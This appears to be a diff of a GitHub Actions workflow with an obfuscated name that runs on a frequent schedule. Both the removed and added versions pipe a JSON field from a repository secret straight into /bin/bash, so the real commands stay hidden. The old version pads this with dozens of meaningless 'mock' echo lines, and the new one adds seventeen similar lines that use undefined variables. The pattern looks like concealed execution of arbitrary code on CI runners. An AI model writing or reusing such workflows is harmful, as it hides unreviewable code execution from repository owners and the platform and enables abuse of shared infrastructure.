@@ -1,58 +1,35 @@
-name: huangchuangcai6789 #21390
-on: #7036
-  workflow_dispatch: #18
-  schedule: #27416
-    - cron: '2 2/6 * * *' #13670
-jobs:  # 10237
-  build: #26632
-    runs-on: ubuntu-latest #10341
-    steps: #6644
-      - uses: actions/checkout@v4 #31714
-      - name: huangchuangcai6789 #5346
-        env: #13134
-          x10259: ${{ secrets.x10259 }} #20762
+name: huangchuangcai6789
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '26 * * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: huangchuangcai6789
+        env:
+          uzk91: ${{ secrets.uzk91 }}
         run: |
-          echo $x10259 | jq -r .o16349 | /bin/bash #21210
-          echo "Read mock: read -p 'Prompt' var <<< 'input'"
-          echo "Time diff mock: echo \$SECONDS"
-          echo "Files: $(ls | wc -l 2>/dev/null || echo 0)"
-          grep -q "bash" /etc/passwd 2>/dev/null && echo "Bash user exists"
-          echo "Chmod mock: chmod 644 /tmp 2>/dev/null || true"
-          echo "Git mock: git --version 2>/dev/null | head -1 || echo no-git"
-          echo "Subshell: (echo subshell)"
-          echo "Random check: [ $((RANDOM % 2)) -eq 0 ] && echo Even || echo Odd"
-          echo "Random ID: $RANDOM$RANDOM"
-          find /tmp -maxdepth 1 -type f 2>/dev/null | head -1 || true
-          echo "Glob test: echo *.sh 2>/dev/null || echo no-sh"
-          echo "Checksum: $((1000 + RANDOM % 9000))"
-          echo "Trap mock: trap 'echo TRAP' EXIT"
-          echo "Time ms-like: $(date +%s%3N 2>/dev/null || echo 123456)"
-          echo "Tar mock: tar -cf /dev/null /tmp 2>/dev/null || true"
-          echo "String len: ${#HOSTNAME}"
-          [ -z "$RANDOM" ] || echo "Random var set"
-          echo "Command count: echo \$(ls | wc -l 2>/dev/null || echo 0)"
-          echo "Simple calc: $(( 10 + 20 ))"
-          echo "Disk usage (fake): $(df -h . 2>/dev/null | tail -1 || echo N/A)"
-          echo "Random sleep: sleep $((RANDOM % 2)) 2>/dev/null || true"
-          echo "Export mock: export VAR=test"
-          echo "Complex pipe: echo test | tr a-z A-Z | cut -c1-3"
-          echo "Math floor: echo \$(( 5 / 2 ))"
-          echo "Grep mock: grep 'a' <<< 'abc' 2>/dev/null || echo no-grep"
-          echo "Array-like: a=1 b=2 c=3; echo \$a\$b\$c"
-          : ' Another single-line comment '
-          echo "Version: $((1 + RANDOM % 5))"
-          echo "Temp file mock: tmp=\$(mktemp) && echo \$tmp || echo no-tmp"
-          echo "Case mock: case 1 in 1) echo 1;; esac"
-          echo "Temp dir: $(mktemp -d 2>/dev/null || echo /tmp)"
-          for i in {1..3}; do echo "Iter $i"; done
-          echo "Process check: $(ps -ef | wc -l 2>/dev/null || echo 0)"
-          echo "Exit 0 test: exit 0 || true"
-          echo "User: $(whoami)"
-          echo "Time: $(date +%H:%M:%S)"
-          echo "String slice: str=abcdef; echo \${str:0:3}"
-          echo "Arith loop: for ((i=0;i<3;i++)); do echo $i; done"
-          echo "Brace exp: echo file_{1..3}.txt"
-          cat /dev/null > /tmp/.tmpfile 2>/dev/null || true
-          which bash 2>/dev/null || echo "Bash not in path"
-          echo "Dir: $(pwd)"
-          echo "Var default: echo \${VAR:-default}"
+          echo $uzk91 | jq -r .ggku6 | /bin/bash
+          echo $ifd22925 | jq -r .uqtj89881 | /bin/bash
+          echo $zm99847 | jq -r .jvvi31 | /bin/bash
+          echo $naxo20125 | jq -r .bydo3 | /bin/bash
+          echo $uam4349 | jq -r .kr03 | /bin/bash
+          echo $zkie89878 | jq -r .rqeh35336 | /bin/bash
+          echo $scvhh73703 | jq -r .avzd06121 | /bin/bash
+          echo $ost79 | jq -r .uw39736 | /bin/bash
+          echo $ejv2 | jq -r .cci557 | /bin/bash
+          echo $pubx79993 | jq -r .rsm4 | /bin/bash
+          echo $iuld9634 | jq -r .fxhj75 | /bin/bash
+          echo $obh28 | jq -r .nzju7882 | /bin/bash
+          echo $udlq6 | jq -r .hzdk48018 | /bin/bash
+          echo $s782 | jq -r .c4 | /bin/bash
+          echo $zglv84 | jq -r .dgk4459 | /bin/bash
+          echo $evk74 | jq -r .etluf762 | /bin/bash
+          echo $dmp4612 | jq -r .tg06 | /bin/bash
+          echo $p61 | jq -r .pbun30 | /bin/bash
+
